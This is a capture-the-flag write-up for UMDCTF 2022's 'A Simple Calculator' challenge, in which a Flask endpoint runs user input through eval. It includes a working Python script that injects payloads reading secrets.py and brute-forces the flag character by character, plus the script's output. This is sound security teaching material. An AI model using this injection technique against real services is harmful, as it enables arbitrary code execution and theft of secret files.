---
layout: post
title:  "A Simple Calculator"
author: "UMDCTF 2022 (shadow, gary)"
date:   2022-03-05 23:29:13 +0000
categories: ctf umdctf web
description: "a simple writeup"
---
*[Challenge](https://calculator-3tjck.ondigitalocean.app/), [Source](https://umdctf.io/files/6489ffca545a610f3080620dc86169c7/A_Simple_Calculator.zip?token=eyJ1c2VyX2lkIjoxMDg1LCJ0ZWFtX2lkIjo2NjksImZpbGVfaWQiOjcwfQ.YiPyIw.mxMGnS0K6NK8cFZG422WJ8_wTmQ)*  

**TL;DR**: Sending a POST request to /calc allows arbitrary Python code to be executed due to the dangerous `eval` function. Use this to read `secrets.py` (where the flag is hidden), bypassing the output being casted to an integer by using the `.index` method to slowly leak the file.  

*Edit: It's a lot quicker to just use `ord` on each character.*

---  

## Inititation

> Calc you later! :)

The website presents itself as a calculator where you can perform simple arithmetic calculations. Going into inspect element and viewing the network tab shows that whenever you enter a calculation, a POST request is sent to the /calc endpoint, with the JSON data of your calculation.  

![](/assets/images/ctf/umdctf/a_simple_calculator/1.png)

![](/assets/images/ctf/umdctf/a_simple_calculator/2.png)  

We are given the relevant code in `app.py`:  

```python
@app.route('/calc', methods=['POST'])
def calc():
    val = 0
    try:
        z(request.json['f'])
        val = f"{int(eval(request.json['f']))}"
    except Exception as e:
        val = 0

    response = app.response_class(
        response=json.dumps({'result': val}),
        status=200,
        mimetype='application/json'
    )
    return response
```  

Note the "eval". We control the input as we supply the request json, and there seem to be no restrictions on the environment in which the code is executed. Executing random commands supplied by the user seems pretty bad.  

---  

## Exploitation

Now that we have a clear weakness to exploit, let's see what we want to do with it. `secrets.py` has a variable called `FLAG` which looks interesting, so let's try to read the contents of that file.  

An issue might be that the output of whatever is `eval`ed is casted to `int`, but as we only want the first line (the line with `FLAG =`), that can be bypassed by using `.index`, which returns the index of a substring in a string, and -1 otherwise.  

Therefore, we can slowly build up the file by bruteforcing different characters and seeing if they return 0. If they don't, they aren't at the start of the file and we don't care about them. If they do, then we can add that to a string of known characters that begin the file, and then bruteforce the string + next character, and then the string + next, etc... until we build up the file!  

Here's my code to automate this:  	

```python
import requests
from string import printable as p

url = "https://calculator-3tjck.ondigitalocean.app/"

s = requests.session()

p = p[:-6]

# We already know that the file begins with FLAG = '
current = "FLAG = '"
char = ""
i = 0

s = requests.session()

while True:

	char = p[i]

	json = {"f":f""" open("secrets.py").read().index("{current+char}") """}
	r = s.post(url+"calc", json=json)

	if r.text.split(":")[1][2:-2] == "" or int(r.text.split(":")[1][2:-2]) != 0:
		# It's not 0, so we don't care
		i += 1

	else:
		# string + character begins the file, so we concatenate it to our current string
		i = 0
		current += char
		print(current)
		if char == "'":
			# Finished calculating the flag
			print("Done")
			break
```

```
FLAG = 'U
FLAG = 'UM
FLAG = 'UMD
FLAG = 'UMDC
FLAG = 'UMDCT
FLAG = 'UMDCTF                                                                              
FLAG = 'UMDCTF{
FLAG = 'UMDCTF{w
FLAG = 'UMDCTF{w0
FLAG = 'UMDCTF{w0w
FLAG = 'UMDCTF{w0w_
FLAG = 'UMDCTF{w0w_b
FLAG = 'UMDCTF{w0w_br
FLAG = 'UMDCTF{w0w_bru
FLAG = 'UMDCTF{w0w_brut
FLAG = 'UMDCTF{w0w_brut3
FLAG = 'UMDCTF{w0w_brut3f
FLAG = 'UMDCTF{w0w_brut3f0
FLAG = 'UMDCTF{w0w_brut3f0r
FLAG = 'UMDCTF{w0w_brut3f0rc
FLAG = 'UMDCTF{w0w_brut3f0rc3
FLAG = 'UMDCTF{w0w_brut3f0rc3i
FLAG = 'UMDCTF{w0w_brut3f0rc3in
FLAG = 'UMDCTF{w0w_brut3f0rc3ing
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4c
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ct
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4l
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4ll
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0r
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rk
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}
FLAG = 'UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}'
Done
```  

```
Flag: UMDCTF{w0w_brut3f0rc3ing_4ctu4lly_w0rks!}
```
